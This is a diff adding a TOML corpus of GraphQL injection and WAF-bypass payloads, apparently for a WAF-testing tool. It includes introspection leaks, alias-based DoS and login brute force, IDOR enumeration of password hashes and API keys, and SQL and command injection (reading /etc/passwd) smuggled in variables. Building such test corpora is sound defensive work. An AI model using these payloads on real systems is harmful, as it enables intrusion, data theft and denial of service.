@@ -1,0 +1,153 @@
+schema = 1
+# GraphQL injection corpus — the WAF surface the `gql-diff` command
+# probes. Most REST WAFs see only `POST /graphql` and miss the
+# structure inside the body. These payloads exercise:
+#   - Introspection leaks via `__schema` / `__type` queries
+#   - Alias amplification (one query → N executions per alias)
+#   - Operation-name spoofing (sending a malicious op tagged as a benign name)
+#   - Batched-operation array-payload bypass
+#   - Field duplication / fragment nesting (cost-limit bypass)
+#   - `application/graphql` content-type (skips body-shape inspection)
+#   - GET-shaped query (skips POST-body inspection entirely)
+#
+# Manual form:
+#   wafrift gql-diff --target http://localhost:8080/graphql
+#   wafrift evade --payload '<paste case>' --grammar graphql
+#
+# 2026-05-23 — initial 20-case authoring per perf-hunt N08 (gap closed).
+
+# ── Introspection family — leaks the schema to an unauthenticated attacker ──
+
+[[case]]
+id = "graphql_introspection_full_schema"
+class = "graphql"
+payload = '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
+description = "Canonical full-schema introspection — every type and field name leaks. WAFs that don't parse GraphQL body see only `POST /graphql` and pass it through."
+
+[[case]]
+id = "graphql_introspection_query_type"
+class = "graphql"
+payload = '{"query":"{ __type(name: \"Query\") { name fields { name } } }"}'
+description = "Targeted introspection of the Query root — narrower surface, less likely to trip rule-based GraphQL detection that keys on `__schema`."
+
+[[case]]
+id = "graphql_introspection_via_get"
+class = "graphql"
+payload = "?query=%7B%20__schema%20%7B%20types%20%7B%20name%20%7D%20%7D%20%7D"
+description = "GET-shaped introspection — many GraphQL servers accept GET for queries (Apollo default). WAFs inspecting only POST bodies miss this entirely."
+
+# ── Alias amplification — one HTTP request, N executions ──
+
+[[case]]
+id = "graphql_alias_bomb_x10"
+class = "graphql"
+payload = '{"query":"{ a:user(id:1){name} b:user(id:1){name} c:user(id:1){name} d:user(id:1){name} e:user(id:1){name} f:user(id:1){name} g:user(id:1){name} h:user(id:1){name} i:user(id:1){name} j:user(id:1){name} }"}'
+description = "10× alias amplification — single body, 10 user lookups. CPU / DB DoS surface. Cost-limit middleware that counts top-level fields misses this if it doesn't unwrap aliases."
+
+[[case]]
+id = "graphql_alias_login_brute"
+class = "graphql"
+payload = '{"query":"{ a:login(p:\"pass1\"){ok} b:login(p:\"pass2\"){ok} c:login(p:\"pass3\"){ok} d:login(p:\"pass4\"){ok} e:login(p:\"pass5\"){ok} }"}'
+description = "Brute-force via alias — 5 login attempts in one HTTP request. Standard rate-limit middleware counts requests, not GraphQL operations."
+
+# ── Batched operations — JSON array payload at body root ──
+
+[[case]]
+id = "graphql_batch_array_2_ops"
+class = "graphql"
+payload = '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
+description = "Array-of-operations batch payload (Apollo / Hasura default). WAFs that expect a single `{query:...}` object pass an array unchallenged."
+
+[[case]]
+id = "graphql_batch_introspection_mixed_with_benign"
+class = "graphql"
+payload = '[{"query":"{me{name}}"},{"query":"{__schema{types{name}}}"}]'
+description = "Batch of [benign query, introspection]. WAFs that inspect only the first element of an array (lazy parse) miss the introspection in slot 2."
+
+# ── Operation-name spoofing ──
+
+[[case]]
+id = "graphql_op_name_spoof_login_as_search"
+class = "graphql"
+payload = '{"query":"query Search($p:String){login(password:$p){ok}}","operationName":"Search","variables":{"p":"admin"}}'
+description = "Mutation-shaped login disguised under operationName='Search'. Logs / WAFs that key on operation name (looking for `Login` / `Mutation`) miss this."
+
+# ── Mutation-as-query confusion ──
+
+[[case]]
+id = "graphql_mutation_in_query_field"
+class = "graphql"
+payload = '{"query":"query {deleteUser(id:1){ok}}"}'
+description = "Mutation called via `query` keyword instead of `mutation` (most resolvers don't care about the keyword, only the field name). WAFs gating mutations by the top-level `mutation` keyword miss this."
+
+# ── Field duplication / cost-limit bypass ──
+
+[[case]]
+id = "graphql_field_duplication_x20"
+class = "graphql"
+payload = '{"query":"{me{name name name name name name name name name name name name name name name name name name name name}}"}'
+description = "20× field duplication — single `me` resolution, 20 field reads. Naïve cost calc that sums fields gets a 20× cost; servers that dedupe still execute once. Reverse: servers that DON'T dedupe pay the CPU cost."
+
+[[case]]
+id = "graphql_fragment_nesting_deep"
+class = "graphql"
+payload = '{"query":"{user{...A}} fragment A on User{posts{...B}} fragment B on Post{comments{...C}} fragment C on Comment{author{...A}}"}'
+description = "Cyclic fragment definitions — A→B→C→A. graphql-js detects this; custom implementations may infinite-loop or stack-overflow."
+
+# ── Content-type / encoding bypass ──
+
+[[case]]
+id = "graphql_application_graphql_content_type"
+class = "graphql"
+payload = "{ __schema { types { name } } }"
+description = "Body is raw GraphQL (no JSON wrapper); content-type would be `application/graphql`. WAFs that only inspect JSON bodies see this as opaque text."
+
+[[case]]
+id = "graphql_jsonp_callback_wrap"
+class = "graphql"
+payload = 'cb({"query":"{__schema{types{name}}}"})'
+description = "JSONP-wrapped query body. WAFs scanning for `{query:` at body start miss the leading `cb(` wrapper."
+
+# ── Pre-defined credentials / IDOR via GraphQL ──
+
+[[case]]
+id = "graphql_idor_admin_user_id"
+class = "graphql"
+payload = '{"query":"{user(id:1){email passwordHash apiKeys}}"}'
+description = "IDOR — request admin user (id=1) including sensitive fields. WAFs without authZ awareness pass this; backends with broken authZ leak."
+
+[[case]]
+id = "graphql_idor_via_alias_enum"
+class = "graphql"
+payload = '{"query":"{ u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email} u4:user(id:4){email} u5:user(id:5){email} }"}'
+description = "User enumeration via numeric id range using aliases. One request, 5 IDOR probes."
+
+# ── Directive abuse ──
+
+[[case]]
+id = "graphql_skip_directive_truthy"
+class = "graphql"
+payload = '{"query":"{user(id:1){name @skip(if:false) email @skip(if:false)}}"}'
+description = "@skip directive with falsy condition (= include the field). Some WAFs look for `@skip(if:true)` to redact PII — operator-controlled `if:` value defeats that."
+
+# ── SQL/Command injection PASSED THROUGH GraphQL string variables ──
+
+[[case]]
+id = "graphql_var_sqli_smuggle"
+class = "graphql"
+payload = "{\"query\":\"query Q($f:String){search(filter:$f){id}}\",\"variables\":{\"f\":\"' OR 1=1--\"}}"
+description = "SQLi payload smuggled in a GraphQL variable. WAFs scanning the query string for SQL keywords miss the variable section."
+
+[[case]]
+id = "graphql_var_cmdi_smuggle"
+class = "graphql"
+payload = '{"query":"mutation M($n:String){renameUser(name:$n){ok}}","variables":{"n":";cat /etc/passwd"}}'
+description = "Command injection in variable. Same lazy-scan bypass as SQLi-in-variable."
+
+# ── Trace exposure ──
+
+[[case]]
+id = "graphql_apollo_tracing_extension"
+class = "graphql"
+payload = '{"query":"{__schema{types{name}}}","extensions":{"tracing":true}}'
+description = "Apollo Tracing extension — when enabled, server response includes per-resolver timing. Information disclosure surface."
